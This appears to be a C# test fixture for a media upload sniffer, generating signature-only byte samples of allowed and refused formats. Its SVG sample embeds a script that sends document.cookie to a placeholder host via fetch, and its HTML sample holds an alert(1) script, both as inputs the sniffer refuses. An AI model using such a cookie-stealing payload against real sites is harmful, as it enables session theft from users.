using System.Text;

namespace Modbot.Evidence.Tests.Fakes;

/// <summary>
/// Byte patterns with the leading signatures of the formats Modbot accepts and refuses.
/// </summary>
/// <remarks>
/// Signatures plus padding, not real media, because the sniffer is deliberately a signature check
/// rather than a decoder — decoding attacker-influenced media on the server is the dependency the
/// design refuses to take on. Testing it with real files would be testing something the production
/// code never does.
/// </remarks>
public static class SampleMedia
{
    public static byte[] Png(int size = 256)
        => Build([0x89, (byte)'P', (byte)'N', (byte)'G', 0x0D, 0x0A, 0x1A, 0x0A], size);

    public static byte[] Jpeg(int size = 256) => Build([0xFF, 0xD8, 0xFF, 0xE0], size);

    public static byte[] Gif(int size = 256) => Build(Encoding.ASCII.GetBytes("GIF89a"), size);

    public static byte[] Webp(int size = 256)
    {
        var bytes = new byte[Math.Max(size, 16)];
        Encoding.ASCII.GetBytes("RIFF").CopyTo(bytes, 0);
        Encoding.ASCII.GetBytes("WEBP").CopyTo(bytes, 8);
        Fill(bytes, 12);
        return bytes;
    }

    public static byte[] Mp4(string brand = "isom", int size = 256)
    {
        var bytes = new byte[Math.Max(size, 16)];
        bytes[3] = 0x18;
        Encoding.ASCII.GetBytes("ftyp").CopyTo(bytes, 4);
        Encoding.ASCII.GetBytes(brand).CopyTo(bytes, 8);
        Fill(bytes, 12);
        return bytes;
    }

    /// <summary>An ISO base media file that is not MP4 — must be refused.</summary>
    public static byte[] Avif(int size = 256) => Mp4("avif", size);

    public static byte[] Webm(int size = 256)
    {
        var bytes = new byte[Math.Max(size, 64)];
        ReadOnlySpan<byte> ebml = [0x1A, 0x45, 0xDF, 0xA3];
        ebml.CopyTo(bytes);
        Encoding.ASCII.GetBytes("webm").CopyTo(bytes, 24);
        return bytes;
    }

    /// <summary>Matroska without the WebM doctype — a real format, off the allowlist.</summary>
    public static byte[] Matroska(int size = 256)
    {
        var bytes = new byte[Math.Max(size, 64)];
        ReadOnlySpan<byte> ebml = [0x1A, 0x45, 0xDF, 0xA3];
        ebml.CopyTo(bytes);
        Encoding.ASCII.GetBytes("matroska").CopyTo(bytes, 24);
        return bytes;
    }

    /// <summary>The classic: a script execution format with an image's file extension.</summary>
    public static byte[] Svg()
        => Encoding.UTF8.GetBytes(
            """
            <?xml version="1.0"?>
            <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
              <script>fetch('https://example.invalid/?c='+document.cookie)</script>
            </svg>
            """);

    public static byte[] Html()
        => Encoding.UTF8.GetBytes("<!DOCTYPE html><html><body><script>alert(1)</script></body></html>");

    /// <summary>Bytes that are not any recognised format.</summary>
    public static byte[] Noise(int size = 256)
    {
        var bytes = new byte[size];
        for (var i = 0; i < bytes.Length; i++)
            bytes[i] = (byte)(0x40 + (i % 23));

        return bytes;
    }

    private static byte[] Build(ReadOnlySpan<byte> signature, int size)
    {
        var bytes = new byte[Math.Max(size, signature.Length)];
        signature.CopyTo(bytes);
        Fill(bytes, signature.Length);
        return bytes;
    }

    private static void Fill(byte[] bytes, int from)
    {
        for (var i = from; i < bytes.Length; i++)
            bytes[i] = (byte)(i % 251);
    }
}
